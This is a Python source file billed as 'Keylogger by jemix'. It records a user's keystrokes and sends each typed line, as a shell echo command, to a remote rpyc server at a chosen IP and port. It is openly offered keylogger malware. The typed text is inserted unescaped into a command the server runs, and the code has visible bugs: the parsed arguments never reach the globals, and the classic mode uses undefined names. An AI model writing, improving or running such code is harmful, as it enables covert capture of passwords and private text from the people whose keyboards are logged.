import keyboard
import logging
import rpyc
import sys
import argparse
import datetime


SERVER = '127.0.0.1'
PORT = 18861
CLASSIC = False
FILE = 'log.txt'
DTFORMAT = "%Y-%m-%d %H:%M:%S"


class keylogger:

	def log(self,interop = 'enter',ishotkey=False):
		while True:
			recorded = keyboard.record(until= interop)
			hotkey = keyboard.read_hotkey()
			if ishotkey:
				cmd = "echo %s >> %s" % ("[ %s ] " % datetime.datetime.now().strftime(DTFORMAT) + " ".join(keyboard.get_typed_strings(recorded,allow_backspace=True)) + " " + hotkey , FILE)
			else :
				cmd = "echo %s >> %s" % ("[ %s ] " % datetime.datetime.now().strftime(DTFORMAT) + " ".join(keyboard.get_typed_strings(recorded,allow_backspace=True)) , FILE)
			self.send_command(cmd,CLASSIC)

	def send_command(self,command,classic=False):
		if not command:
			return
		try:
			if classic:
				conn = rpyc.classic.connect(host)
				print(msg,file=conn.modules.sys.stdout)
			else :
				conn = rpyc.connect(SERVER,PORT)
				conn.root.run(command)
		except Exception as Err:
			print('Error in send command', str(Err))

def str2bool(v):
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

def main():
    parser = argparse.ArgumentParser(description='Keylogger by jemix')
    parser.add_argument('-port', type=int, default=18861, help="Enter custom port number")
    parser.add_argument('-ip', type=str,default='127.0.0.1', help="Enter custom ip adress")
    parser.add_argument('-f', type=str,default='log.txt', help="Enter log file")
    parser.add_argument("-c", type=str2bool, nargs='?',const=True, default=False,help="Classic server.")
    args = parser.parse_args()

    PORT = args.port
    SERVER  = args.ip
    CLASSIC = args.c
    FILE = args.f

    if not args.port:
        PORT = 18861
    if not args.ip:
    	SERVER = '127.0.0.1'
    if not args.c:
        CLASSIC = False
    if not args.f:
    	FILE = 'log.txt'

    l = keylogger()
    l.log()




if __name__ == "__main__":
	main()

